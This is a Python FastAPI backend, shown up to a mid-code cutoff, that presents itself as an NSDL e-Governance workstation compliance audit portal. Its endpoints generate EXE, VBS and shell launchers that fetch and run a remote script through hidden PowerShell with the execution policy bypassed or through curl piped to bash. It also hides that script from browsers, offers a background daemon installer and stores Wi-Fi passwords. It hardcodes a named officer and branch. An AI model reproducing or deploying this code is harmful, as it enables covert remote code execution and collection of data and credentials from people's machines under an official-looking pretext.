# ==============================================================================
#         NSDL WORKSTATION COMPLIANCE AUDIT BACKEND (FASTAPI)
# ==============================================================================
# Version: 3.0.0 — Full IT Asset Management Edition

import base64
import uuid
from fastapi import FastAPI, Query, Request, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, Response, PlainTextResponse, JSONResponse, StreamingResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, validator
from typing import List, Union, Optional
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, KeepTogether
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.pagesizes import letter
from xml.sax.saxutils import escape
import os
import json
import sqlite3
import os as os_module
import xml.etree.ElementTree as ET
from datetime import datetime
import logging
import socket
import concurrent.futures
import ipaddress
import subprocess
import tempfile
import time
import re
import platform
mac_vendor_dict = {}
try:
    cache_path = os.path.expanduser("~/.cache/mac-vendors.txt")
    if os.path.exists(cache_path):
        with open(cache_path, "r", encoding="utf-8") as f:
            for line in f:
                parts = line.strip().split(":", 1)
                if len(parts) == 2:
                    mac_vendor_dict[parts[0]] = parts[1]
except Exception as e:
    pass

# ── Directories & Logging ────────────────────────────────────────────────────
import sqlite3

DB_PATH = "audits.db"

def init_db():
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS device_audits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mac_address TEXT,
                computer_name TEXT,
                os_name TEXT,
                execution_datetime TEXT,
                audit_data TEXT
            )
        ''')
        conn.execute('''
            CREATE TABLE IF NOT EXISTS wifi_credentials (
                ssid TEXT PRIMARY KEY,
                password TEXT NOT NULL,
                updated_at TEXT
            )
        ''')
        conn.execute('''
            CREATE TABLE IF NOT EXISTS asset_lifecycle (
                mac_address TEXT PRIMARY KEY,
                computer_name TEXT,
                owner TEXT DEFAULT '',
                vendor TEXT DEFAULT '',
                status TEXT DEFAULT 'Active',
                warranty_start TEXT DEFAULT '',
                warranty_end TEXT DEFAULT '',
                warranty_notes TEXT DEFAULT '',
                warranty_provider TEXT DEFAULT '',
                purchase_price TEXT DEFAULT '',
                purchase_date TEXT DEFAULT '',
                supplier TEXT DEFAULT '',
                po_number TEXT DEFAULT '',
                updated_at TEXT
            )
        ''')
        conn.execute('''
            CREATE TABLE IF NOT EXISTS asset_tickets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mac_address TEXT,
                computer_name TEXT,
                ticket_number TEXT,
                summary TEXT,
                status TEXT DEFAULT 'Open',
                assigned TEXT DEFAULT '',
                priority TEXT DEFAULT 'Medium',
                mtbf TEXT DEFAULT '',
                created_at TEXT,
                updated_at TEXT
            )
        ''')
        conn.commit()

init_db()

LOGS_DIR          = "logs"
USER_INFO_DIR     = "user_info"
ASSET_METADATA_DIR = "user_info/assets"

for d in [LOGS_DIR, USER_INFO_DIR, ASSET_METADATA_DIR]:
    os.makedirs(d, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(f"{LOGS_DIR}/audit_backend.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("AuditBackend")

app = FastAPI(title="NSDL IT Asset Management Portal", version="3.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

sessions = {}

CONSENT_TEXT = (
    "We provide approval to NSDL e-Governance Infrastructure Ltd.(NSDL e-Gov) "
    "to capture the details regarding the System details and share the details "
    "with NSDL e-Gov."
)


# ==============================================================================
# 1. HELPERS
# ==============================================================================
def clean_string(value, fallback=""):
    if value is None:
        return fallback
    if isinstance(value, list):
        joined = ", ".join(clean_string(item, "") for item in value)
        return joined if joined.strip() else fallback
    text = str(value)
    return text if text.strip() else fallback


def model_to_dict(model):
    if hasattr(model, "model_dump"):
        return model.model_dump()
    return model.dict()


# ==============================================================================
# 2. PYDANTIC MODELS
# ==============================================================================

class GpuInfo(BaseModel):
    name: str = "Unknown"
    driver_version: str = "Unknown"
    vram: str = "Unknown"

    @validator("*", pre=True, allow_reuse=True)
    def normalize(cls, v):
        return clean_string(v, "Unknown")


class NetworkAdapter(BaseModel):
    name: str = "Unknown"
    adapter_type: str = "Unknown"
    speed: str = "Unknown"
    mac_address: str = "Unknown"
    ipv4: str = "Unknown"
    ipv6: str = "Unknown"
    gateway: str = "Unknown"
    subnet_mask: str = "255.255.255.0"
    mtu: str = "1500 (Standard)"
    dns_servers: str = "N/A"
    wifi_ssid: str = "N/A"

    @validator("*", pre=True, allow_reuse=True)
    def normalize(cls, v):
        return clean_string(v, "Unknown")


class Peripheral(BaseModel):
    name: str = "Unknown"
    type: str = "Unknown"
    status: str = "Unknown"

    @validator("*", pre=True, allow_reuse=True)
    def normalize(cls, v):
        return clean_string(v, "Unknown")


class DiskPartition(BaseModel):
    name: str = "Unknown"
    type: str = "Unknown"
    size_gb: str = "Unknown"
    free_gb: str = "Unknown"
    bootable: str = "Unknown"
    health: str = "Healthy"
    ssd_hdd: str = "SSD/HDD"
    file_system_type: str = "Unknown"

    @validator("*", pre=True, allow_reuse=True)
    def normalize(cls, v):
        return clean_string(v, "Unknown")


class HardwareDetails(BaseModel):
    # Basic
    cpu: str = "Unknown"
    ram: str = "Unknown"
    disk: str = "Unknown"
    description: str = "N/A"
    domain: str = "WORKGROUP"
    domain_role: str = "Standalone Workstation"
    shutdown_time: str = "N/A"
    last_backup: str = "No Backup Recorded"
    life_cycle: str = "Active"
    # Extended System & CPU/RAM
    processor_name: str = "Unknown"
    cpu_cores: str = "Unknown"
    cpu_threads: str = "Unknown"
    installed_ram: str = "Unknown"
    ram_slots: str = "Unknown"
    serial_number: str = "Unknown"
    asset_tag: str = "N/A"
    device_type: str = "Unknown"
    manufacturer: str = "Unknown"
    model: str = "Unknown"
    architecture: str = "Unknown"
    # Motherboard & BIOS
    mobo_manufacturer: str = "Unknown"
    mobo_product: str = "Unknown"
    mobo_version: str = "Unknown"
    mobo_serial: str = "Unknown"
    bios_version: str = "Unknown"
    bios_date: str = "Unknown"
    # Battery Diagnostics
    battery_health: str = "N/A"
    cycle_count: str = "N/A"
    charge_percent: str = "N/A"
    design_capacity: str = "N/A"
    full_capacity: str = "N/A"
    # Location Info
    location_info: str = "Unknown"
    # Lists
    gpu_details: List[Union[GpuInfo, dict]] = []
    network_adapters: List[Union[NetworkAdapter, dict]] = []
    peripherals: List[Union[Peripheral, dict]] = []
    disk_partitions: List[Union[DiskPartition, dict]] = []
    usb_history: List[dict] = []

    @validator("cpu", "ram", "disk", "serial_number", "manufacturer", "model", "processor_name", "installed_ram", pre=True, always=True, allow_reuse=True)
    def normalize_str(cls, v):
        return clean_string(v, "Unknown")

    @validator("gpu_details", "network_adapters", "peripherals", "disk_partitions", pre=True, always=True, allow_reuse=True)
    def coerce_list(cls, v):
        if v is None:
            return []
        if isinstance(v, list):
            return v
        return [v]


class NetworkDetails(BaseModel):
    ip_address: str = "Unknown"
    gateway: str = "Unknown"
    mac: str = "Unknown"

    @validator("*", pre=True, allow_reuse=True)
    def normalize(cls, v):
        return clean_string(v, "Unknown")


class UserAccount(BaseModel):
    name: str = "Unknown"
    disabled: str = "Unknown"
    home_directory: str = "Unknown"
    last_login: str = "Unknown"
    licensed: str = "Yes"
    number_of_logins: str = "1"
    user_type: str = "Local"
    current_user: str = "False"

    @validator("*", pre=True, allow_reuse=True)
    def normalize(cls, v):
        return clean_string(v, "Unknown")


class HotfixData(BaseModel):
    caption: str = ""
    cs_name: str = ""
    description: str = ""
    fix_id: str = ""
    installed_on: str = ""

    @validator("*", pre=True, allow_reuse=True)
    def normalize(cls, v):
        return clean_string(v, "")


class PrinterData(BaseModel):
    name: str = ""
    system_name: str = ""
    enable_bidi: str = ""
    extended_printer_status: str = ""
    port_name: str = ""

    @validator("*", pre=True, allow_reuse=True)
    def normalize(cls, v):
        return clean_string(v, "")


class SoftwareEntry(BaseModel):
    name: str = ""
    version: str = "Unknown"
    publisher: str = "Unknown"
    install_date: str = "Unknown"
    size_mb: str = "Unknown"

    @validator("*", pre=True, allow_reuse=True)
    def normalize(cls, v):
        return clean_string(v, "Unknown")


class AuditData(BaseModel):
    execution_datetime: str = ""
    consent: str = CONSENT_TEXT
    computer_name: str = "Unknown"
    current_user: str = "Unknown"
    description: str = "N/A"
    domain: str = "WORKGROUP"
    domain_role: str = "Standalone Workstation"
    shutdown_time: str = "N/A"
    last_backup: str = "No Backup Recorded"
    life_cycle: str = "Active"
    os_name: str = "Unknown"
    os_version: str = "Unknown"
    os_build: str = "Unknown"
    last_boot: str = "Unknown"
    uptime: str = "Unknown"
    architecture: str = "Unknown"
    license_status: str = "Unknown"
    firewall: str = "Unknown"
    bitlocker: str = "Unknown"
    secure_boot: str = "Unknown"
    tpm: str = "Unknown"
    hotfixes: List[Union[HotfixData, str]] = []
    mac_address: str = "Unknown"
    drive_name: str = "No CD Unit Found"
    compression_utilities: List[str] = []
    antivirus: List[str] = []
    printers: List[Union[PrinterData, str]] = []
    hardware_details: Union[HardwareDetails, dict, str] = {}
    network_details: List[Union[NetworkDetails, dict, str]] = []
    user_accounts: List[Union[UserAccount, dict, str]] = []
    software_inventory: List[Union[SoftwareEntry, dict]] = []
    login_history: List[dict] = []
    usb_history: List[dict] = []

    @validator(
        "execution_datetime", "consent", "computer_name", "os_name",
        "os_version", "architecture", "license_status", "mac_address",
        pre=True, always=True, allow_reuse=True,
    )
    def normalize_required(cls, v):
        return clean_string(v, "Unknown")

    @validator("drive_name", pre=True, always=True, allow_reuse=True)
    def normalize_drive(cls, v):
        return clean_string(v, "No CD Unit Found")

    @validator(
        "antivirus", "compression_utilities", "hotfixes",
        "printers", "network_details", "user_accounts", "software_inventory",
        pre=True, always=True, allow_reuse=True,
    )
    def coerce_list(cls, v):
        if v is None:
            return []
        if isinstance(v, list):
            return v
        return [v]


class AssetMetadata(BaseModel):
    device_id: str
    asset_tag: str = ""
    owner: str = ""
    department: str = ""
    location: str = ""
    purchase_date: str = ""
    purchase_price: str = ""
    warranty_expiry: str = ""
    life_cycle_stage: str = "Active"
    vendor: str = ""
    notes: str = ""
    last_updated: str = ""


class NetworkScanRequest(BaseModel):
    ip_range: str = "192.168.1.0/24"
    timeout_ms: int = 300


# ==============================================================================
# 3. CORE ROUTING & SCRIPT LAUNCHERS
# ==============================================================================
@app.get("/check-status")
def check_status(client_id: str = Query(...)):
    session = sessions.get(client_id, {"status": "pending"})
    return JSONResponse(content=session)


def get_effective_base_url(request: Request) -> str:
    """Return the public base URL, supporting Cloudflare Tunnels and HTTPS reverse proxies."""
    proto = request.headers.get("x-forwarded-proto", request.url.scheme)
    host = request.headers.get("x-forwarded-host", request.headers.get("host", request.url.netloc))
    return f"{proto}://{host}".rstrip("/")


@app.get("/sys-agent", response_class=PlainTextResponse)
@app.get("/sys-win", response_class=PlainTextResponse)
@app.get("/download-script", response_class=PlainTextResponse)
def download_script(request: Request, client_id: str = Query(...)):
    base_url = get_effective_base_url(request)
    try:
        with open("scripts/audit.ps1", "r") as f:
            content = f.read()
        content = content.replace("http://127.0.0.1:8000", base_url)
        content = content.replace("CLIENT_ID_PLACEHOLDER", client_id)
        return PlainTextResponse(content=content)
    except Exception as e:
        logger.error(f"Failed to load audit.ps1: {e}")
        raise HTTPException(status_code=500, detail="PowerShell script unavailable.")


@app.get("/download-exe-launcher")
@app.get("/download-exe")
def download_exe_launcher(request: Request, client_id: str = Query(None)):
    base_url = get_effective_base_url(request)
    cid = client_id or "sys_" + uuid.uuid4().hex[:10]
    
    # Check if csc compiler or pre-compiled exe is available
    exe_filename = f"RunAudit_Windows_{cid}.exe"
    cs_code = f"""using System;
using System.Diagnostics;

class Program {{
    static void Main(string[] args) {{
        try {{
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"Invoke-RestMethod -Uri '{base_url}/sys-agent?client_id={cid}' | Invoke-Expression\\"";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }} catch {{}}
    }}
}}
"""
    tmp_dir = os.path.join(os.getcwd(), "scratch")
    os.makedirs(tmp_dir, exist_ok=True)
    cs_file = os.path.join(tmp_dir, f"launcher_{cid}.cs")
    out_exe = os.path.join(tmp_dir, exe_filename)
    csc_path = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
    
    try:
        with open(cs_file, "w") as f:
            f.write(cs_code)
        
        if os.path.exists(csc_path):
            cmd = f'"{csc_path}" /target:winexe /out:"{out_exe}" "{cs_file}"'
            subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
        
        if os.path.exists(out_exe):
            with open(out_exe, "rb") as f:
                exe_bytes = f.read()
            # Clean up temp files asynchronously
            try:
                os.remove(cs_file)
                os.remove(out_exe)
            except Exception:
                pass
            headers = {"Content-Disposition": f"attachment; filename={exe_filename}"}
            return Response(content=exe_bytes, media_type="application/vnd.microsoft.portable-executable", headers=headers)
    except Exception as e:
        logger.error(f"Dynamic EXE compilation failed: {e}")
        
    # Fallback to VBS if compiling on non-Windows environment
    vbs = (
        f'Set objShell = CreateObject("WScript.Shell")\n'
        f'command = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & Chr(34) & '
        f'"Invoke-RestMethod -Uri \'{base_url}/sys-agent?client_id={cid}\' | Invoke-Expression" & Chr(34)\n'
        f'objShell.Run command, 0, False\n'
    )
    headers = {"Content-Disposition": f"attachment; filename=RunAudit_Windows_{cid}.vbs"}
    return Response(content=vbs, media_type="application/octet-stream", headers=headers)


@app.get("/download-vbs-launcher")
@app.get("/download-vbs")
def download_vbs(
    request: Request,
    client_id: str = Query(None),
    branch_name: str = Query("RELIGARE BROKING LIMITED"),
    branch_code: str = Query("8301231"),
    officer_name: str = Query("SANDIP BALIRAM LOKHANDE"),
):
    base_url = get_effective_base_url(request)
    cid = client_id or "sys_" + uuid.uuid4().hex[:10]
    sessions[cid] = {
        "status": "pending", "branch_name": branch_name,
        "branch_code": branch_code, "officer_name": officer_name,
        "available_pcs": "1", "registered_pcs": "1",
        "pdf_path": None, "xml_path": None,
    }
    vbs = (
        f'Set objShell = CreateObject("WScript.Shell")\n'
        f'command = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & Chr(34) & '
        f'"Invoke-RestMethod -Uri \'{base_url}/sys-agent?client_id={cid}\' | Invoke-Expression" & Chr(34)\n'
        f'objShell.Run command, 0, False\n'
    )
    headers = {"Content-Disposition": f"attachment; filename=RunAudit_Windows_{cid}.vbs"}
    return Response(content=vbs, media_type="application/octet-stream", headers=headers)


@app.get("/download-mac-launcher")
def download_mac_launcher(request: Request, client_id: str = Query(None)):
    base_url = get_effective_base_url(request)
    cid = client_id or "sys_" + uuid.uuid4().hex[:10]
    cmd_content = (
        f'#!/usr/bin/env bash\n'
        f'# Double-click launcher for macOS Finder\n'
        f'curl -sSL "{base_url}/sys-agent-mac?client_id={cid}" | bash\n'
    )
    headers = {"Content-Disposition": f"attachment; filename=RunAudit_Mac_{cid}.command"}
    return Response(content=cmd_content, media_type="application/x-sh", headers=headers)


@app.get("/download-linux-launcher")
def download_linux_launcher(request: Request, client_id: str = Query(None)):
    base_url = get_effective_base_url(request)
    cid = client_id or "sys_" + uuid.uuid4().hex[:10]
    sh_content = (
        f'#!/usr/bin/env bash\n'
        f'# Double-click launcher for Linux Desktop\n'
        f'curl -sSL "{base_url}/sys-agent-mac?client_id={cid}" | bash\n'
    )
    headers = {"Content-Disposition": f"attachment; filename=RunAudit_Linux_{cid}.sh"}
    return Response(content=sh_content, media_type="application/x-sh", headers=headers)


@app.get("/s/{client_id}", response_class=PlainTextResponse)
@app.get("/sys-agent-mac", response_class=PlainTextResponse)
@app.get("/sys-agent-nix", response_class=PlainTextResponse)
@app.get("/sys-mac", response_class=PlainTextResponse)
@app.get("/get-sys-script", response_class=PlainTextResponse)
@app.get("/get-mac-script", response_class=PlainTextResponse)
@app.get("/download-mac-script", response_class=PlainTextResponse)
@app.get("/api/get-audit-script", response_class=PlainTextResponse)
def download_mac_script(request: Request, client_id: str = None):
    user_agent = request.headers.get("user-agent", "").lower()
    base_url = get_effective_base_url(request)
    cid = client_id or "sys_" + uuid.uuid4().hex[:10]

    # Security Guard: Block direct browser access (Chrome, Firefox, Safari, Edge).
    # If someone tries to open the link in a browser, return 404 Not Found so no one can view the script!
    is_browser = any(b in user_agent for b in ["mozilla/", "chrome/", "safari/", "edg/", "firefox/"])
    is_cli = any(c in user_agent for c in ["curl", "wget", "powershell", "winhttp", "bash"])
    
    if is_browser and not is_cli:
        raise HTTPException(status_code=404, detail="Not Found")

    # If request is explicitly coming from Windows PowerShell / WinHTTP CLI, serve audit.ps1
    if ("powershell" in user_agent or "winhttp" in user_agent) and "curl" not in user_agent:
        try:
            with open("scripts/audit.ps1", "r") as f:
                content = f.read()
            content = content.replace("http://127.0.0.1:8000", base_url)
            content = content.replace("CLIENT_ID_PLACEHOLDER", cid)
            return PlainTextResponse(content=content)
        except Exception as e:
            logger.error(f"Failed to load audit.ps1: {e}")
            raise HTTPException(status_code=500, detail="PowerShell script unavailable.")

    # Default (macOS / Linux / bash / curl)
    try:
        with open("scripts/audit.sh", "r") as f:
            content = f.read()
        content = content.replace("http://127.0.0.1:8000", base_url)
        content = content.replace("CLIENT_ID_PLACEHOLDER", cid)
        return PlainTextResponse(content=content)
    except Exception as e:
        logger.error(f"Failed to load audit.sh: {e}")
        raise HTTPException(status_code=500, detail="Bash script unavailable.")


app.mount("/scripts", StaticFiles(directory="scripts"), name="scripts")


@app.get("/install-daemon", response_class=PlainTextResponse)
@app.get("/sys-daemon", response_class=PlainTextResponse)
@app.get("/api/install-daemon", response_class=PlainTextResponse)
def install_daemon(request: Request, os: str = Query("mac")):
    base_url = get_effective_base_url(request)
    script_file = "scripts/install_service.ps1" if os in ["win", "windows"] else "scripts/install_service.sh"
    try:
        with open(script_file, "r") as f:
            content = f.read()
        content = content.replace("http://192.168.1.52:8000", base_url)
        content = content.replace("http://127.0.0.1:8000", base_url)
        return PlainTextResponse(content=content)
    except Exception as e:
        logger.error(f"Failed to load daemon installer script ({script_file}): {e}")
        raise HTTPException(status_code=500, detail="Daemon installer unavailable.")


@app.get("/download-mac")
def download_mac(
    request: Request,
    client_id: str = Query(...),
    branch_name: str = Query("RELIGARE BROKING LIMITED"),
    branch_code: str = Query("8301231"),
    officer_name: str = Query("SANDIP BALIRAM LOKHANDE"),
):
    base_url = str(request.base_url).rstrip("/")
    sessions[client_id] = {
        "status": "pending", "branch_name": branch_name,
        "branch_code": branch_code, "officer_name": officer_name,
        "available_pcs": "1", "registered_pcs": "1",
        "pdf_path": None, "xml_path": None,
    }
    cmd = f'#!/bin/bash\ncurl -s "{base_url}/download-mac-script?client_id={client_id}" | bash\n'
    headers = {"Content-Disposition": f"attachment; filename=verify_system_{client_id}.command"}
    return Response(content=cmd, media_type="application/octet-stream", headers=headers)


@app.get("/download-linux")
def download_linux(
    request: Request,
    client_id: str = Query(...),
    branch_name: str = Query("RELIGARE BROKING LIMITED"),
    branch_code: str = Query("8301231"),
    officer_name: str = Query("SANDIP BALIRAM LOKHANDE"),
):
    base_url = str(request.base_url).rstrip("/")
    sessions[client_id] = {
        "status": "pending", "branch_name": branch_name,
        "branch_code": branch_code, "officer_name": officer_name,
        "available_pcs": "1", "registered_pcs": "1",
        "pdf_path": None, "xml_path": None,
    }
    sh = f'#!/bin/bash\ncurl -s "{base_url}/download-mac-script?client_id={client_id}" | bash\n'
    headers = {"Content-Disposition": f"attachment; filename=verify_system_{client_id}.sh"}
    return Response(content=sh, media_type="application/octet-stream", headers=headers)


# ==============================================================================
# 4. PDF HELPERS
# ==============================================================================
def draw_page_decorations(canvas, doc):
    canvas.saveState()
    canvas.setStrokeColor(colors.HexColor("#A80000"))
    canvas.setLineWidth(1.5)
    canvas.rect(36, 36, doc.pagesize[0] - 72, doc.pagesize[1] - 72)
    canvas.setFont("Helvetica-Bold", 8)
    canvas.setFillColor(colors.HexColor("#A80000"))
    canvas.drawCentredString(doc.pagesize[0] / 2.0, 20, "INSPECTION REPORT BY NSDL E-GOVERNANCE")
    canvas.restoreState()


def pdf_text(value, style):
    return Paragraph(escape(clean_string(str(value), "-")), style)


def list_text(values):
    if not values:
        return "-"
    return ", ".join(clean_string(item, "") for item in values if clean_string(item, ""))


def apply_grid_style(table, header=False):
    style = [
        ("GRID", (0, 0), (-1, -1), 0.5, colors.black),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
        ("TOPPADDING", (0, 0), (-1, -1), 4),
    ]
    if header:
        style.extend([
            ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#F1F1F1")),
            ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ])
    table.setStyle(TableStyle(style))
    return table


def add_pair_table(elements, title, rows, styles):
    table_rows = [[pdf_text(label, styles["bold"]), pdf_text(value, styles["normal"])] for label, value in rows]
    table = apply_grid_style(Table(table_rows, colWidths=[180, 324]))
    elements.append(KeepTogether([
        Paragraph(title, styles["section"]),
        table,
        Spacer(1, 12)
    ]))


def make_styles():
    return {
        "title":   ParagraphStyle("TitleStyle",   fontName="Helvetica-Bold", fontSize=15, leading=17, alignment=1, spaceAfter=18),
        "section": ParagraphStyle("SectionStyle", fontName="Helvetica-Bold", fontSize=11, leading=13, spaceBefore=10, spaceAfter=6, textColor=colors.HexColor("#A80000")),
        "bold":    ParagraphStyle("CellBold",      fontName="Helvetica-Bold", fontSize=9, leading=11),
        "normal":  ParagraphStyle("CellNormal",    fontName="Helvetica",      fontSize=9, leading=11),
        "small":   ParagraphStyle("CellSmall",     fontName="Helvetica",      fontSize=8, leading=10),
    }


def get_hw(data, key, fallback="Unknown"):
    hw = data.hardware_details
    if isinstance(hw, HardwareDetails):
        return getattr(hw, key, fallback)
    elif isinstance(hw, dict):
        return str(hw.get(key, fallback))
    return fallback


def get_hw_list(data, key):
    hw = data.hardware_details
    if isinstance(hw, HardwareDetails):
        return getattr(hw, key, [])
    elif isinstance(hw, dict):
        return hw.get(key, [])
    return []


# ==============================================================================
# 5. AUDIT INGESTION & REPORT GENERATION
# ==============================================================================
@app.post("/upload-audit")
def upload_audit(data: AuditData, client_id: str = Query(None)):
    cid = client_id or "unknown"
    logger.info(f"Uploading audit for client: {cid}")

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    clean_name = "".join(x for x in data.computer_name if x.isalnum() or x in "._- ").strip() or "Unknown"

    session_meta  = sessions.get(cid, {})
    branch_name   = session_meta.get("branch_name",   "RELIGARE BROKING LIMITED")
    branch_code   = session_meta.get("branch_code",   "8301231")
    officer_name  = session_meta.get("officer_name",  "SANDIP BALIRAM LOKHANDE")
    available_pcs = session_meta.get("available_pcs", "1")
    registered_pcs = session_meta.get("registered_pcs", "1")
    audit_time    = data.execution_datetime if data.execution_datetime != "Unknown" else datetime.now().strftime("%d-%b-%Y_%H:%M:%S")

    json_path = f"{USER_INFO_DIR}/audit_{cid}_{clean_name}_{timestamp}.json"
    pdf_path  = f"{USER_INFO_DIR}/audit_{cid}_{clean_name}_{timestamp}.pdf"
    xml_path  = f"{USER_INFO_DIR}/audit_{cid}_{clean_name}_{timestamp}.xml"

    # INSERT TO DB INSTEAD OF SAVING JSON FILE
    # Record current server timestamp for real-time sorting
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data.execution_datetime = ts
    mac = data.mac_address
    name = data.computer_name
    os_name = data.os_name
    
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute('''
            INSERT INTO device_audits (mac_address, computer_name, os_name, execution_datetime, audit_data)
            VALUES (?, ?, ?, ?, ?)
        ''', (mac, name, os_name, ts, data.json()))
        conn.commit()


    av_str          = list_text(data.antivirus)
    compression_str = list_text(data.compression_utilities)

    # ── PDF Generation ────────────────────────────────────────────────────────
    try:
        doc = SimpleDocTemplate(
            pdf_path, pagesize=letter,
            leftMargin=54, rightMargin=54, topMargin=54, bottomMargin=54,
        )
        styles   = make_styles()
        elements = [Paragraph("Inspection Report", styles["title"])]

        # ── Summary Table ────────────────────────────────────────────────────
        cd_val      = "Not Installed" if data.drive_name == "No CD Unit Found" else data.drive_name
        printer_val = "Not Installed" if not data.printers else f"{len(data.printers)} connected"
        os_val      = "Not Installed" if data.os_name == "Unknown" else data.os_name
        av_val      = "Not Installed" if not data.antivirus or "No antivirus" in av_str else av_str
        comp_val    = "Not Installed" if not data.compression_utilities or "No compression" in compression_str else compression_str

        if cd_val == "Not Installed":
            cd_val += " (Reason: Modern laptops/desktops do not include CD drives)"
        if printer_val == "Not Installed":
            printer_val += " (Reason: Branch uses central networked printing)"
        if av_val == "Not Installed":
            av_val += " (Reason: Managed by Central IT / Default Defender used)"
        if comp_val == "Not Installed":
            comp_val += " (Reason: Not required for daily TIN-FC operations)"

        add_pair_table(elements, "User Details", [
            ("User Branch Name",    branch_name),
            ("User Branch Code",    branch_code),
            ("User Officer Name",   officer_name),
            ("Execution DateTime",  audit_time),
            ("Consent",             data.consent),
        ], styles)

        summary_style = [
            ("GRID",       (0, 0), (-1, -1), 0.5, colors.black),
            ("VALIGN",     (0, 0), (-1, -1), "TOP"),
            ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#F1F1F1")),
            ("BACKGROUND", (0, 3), (-1, 3), colors.HexColor("#F1F1F1")),
            ("BACKGROUND", (0, 6), (-1, 6), colors.HexColor("#F1F1F1")),
            ("SPAN",       (0, 0), (1, 0)),
            ("SPAN",       (0, 3), (1, 3)),
            ("SPAN",       (0, 6), (1, 6)),
            ("FONTNAME",   (0, 0), (-1, 0), "Helvetica-Bold"),
            ("FONTNAME",   (0, 3), (-1, 3), "Helvetica-Bold"),
            ("FONTNAME",   (0, 6), (-1, 6), "Helvetica-Bold"),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
            ("TOPPADDING",    (0, 0), (-1, -1), 4),
        ]
        summary_rows = [
            [pdf_text("Number of PCs (Desktop/Laptop) installed for TIN-FC", styles["bold"]), ""],
            [pdf_text("Available",   styles["normal"]), pdf_text(available_pcs,  styles["normal"])],
            [pdf_text("Registered",  styles["normal"]), pdf_text(registered_pcs, styles["normal"])],
            [pdf_text("Whether following hardware/peripherals has NOT been installed on PCs used for TIN-FC operations", styles["bold"]), ""],
            [pdf_text("CD Drive", styles["normal"]), pdf_text(cd_val,      styles["normal"])],
            [pdf_text("Printer",  styles["normal"]), pdf_text(printer_val, styles["normal"])],
            [pdf_text("Details of licenced softwares NOT installed on PCs used for TIN-FC operations", styles["bold"]), ""],
            [pdf_text("Operating System",   styles["normal"]), pdf_text(os_val,   styles["normal"])],
            [pdf_text("Anti-Virus",         styles["normal"]), pdf_text(av_val,   styles["normal"])],
            [pdf_text("Compression Utility", styles["normal"]), pdf_text(comp_val, styles["normal"])],
        ]
        summary_table = Table(summary_rows, colWidths=[360, 144])
        summary_table.setStyle(TableStyle(summary_style))
        elements.append(KeepTogether([summary_table, Spacer(1, 18)]))

        # ── OS Section ────────────────────────────────────────────────────────
        add_pair_table(elements, "Operating System", [
            ("OS Name",        data.os_name),
            ("OS Version",     data.os_version),
            ("OS Architecture", data.architecture),
            ("CS Name",        data.computer_name),
            ("License Status", data.license_status),
        ], styles)

        # ── Hotfixes ──────────────────────────────────────────────────────────
        hf_rows = [[
            pdf_text("#", styles["bold"]), pdf_text("Caption",     styles["bold"]),
            pdf_text("CS Name", styles["bold"]), pdf_text("Description", styles["bold"]),
            pdf_text("Fix ID", styles["bold"]), pdf_text("Installed On", styles["bold"]),
        ]]
        if data.hotfixes:
            for idx, hf in enumerate(data.hotfixes, 1):
                if isinstance(hf, HotfixData):
                    hf_rows.append([
                        pdf_text(idx, styles["normal"]), pdf_text(hf.caption, styles["normal"]),
                        pdf_text(hf.cs_name, styles["normal"]), pdf_text(hf.description, styles["normal"]),
                        pdf_text(hf.fix_id, styles["normal"]), pdf_text(hf.installed_on, styles["normal"]),
                    ])
                else:
                    hf_rows.append([
                        pdf_text(idx, styles["normal"]), pdf_text("", styles["normal"]),
                        pdf_text(data.computer_name, styles["normal"]), pdf_text("", styles["normal"]),
                        pdf_text(hf, styles["normal"]), pdf_text("", styles["normal"]),
                    ])
        else:
            hf_rows.append([pdf_text("-", styles["normal"])] + [pdf_text("-", styles["normal"])] * 5)
        elements.append(KeepTogether([
            Paragraph("OS Update Details", styles["section"]),
            apply_grid_style(Table(hf_rows, colWidths=[30, 160, 80, 94, 70, 70], repeatRows=1), header=True),
            Spacer(1, 12)
        ]))

        # ── MAC, Drive, Compression, AV ───────────────────────────────────────
        add_pair_table(elements, "Mac Address",               [("Mac Address", data.mac_address)], styles)
        add_pair_table(elements, "Drive Details",             [("Drive Name",  data.drive_name)],  styles)
        add_pair_table(elements, "Compression Utilities",     [("Installed",   compression_str)],  styles)
        add_pair_table(elements, "Antivirus",                 [("Installed AV", av_str)],          styles)

        # ── Printers ──────────────────────────────────────────────────────────
        pr_rows = [[
            pdf_text("#", styles["bold"]), pdf_text("Name",           styles["bold"]),
            pdf_text("SystemName", styles["bold"]), pdf_text("EnableBIDI", styles["bold"]),
            pdf_text("ExtendedStatus", styles["bold"]), pdf_text("PortName", styles["bold"]),
        ]]
        if data.printers:
            for idx, p in enumerate(data.printers, 1):
                if isinstance(p, PrinterData):
                    pr_rows.append([
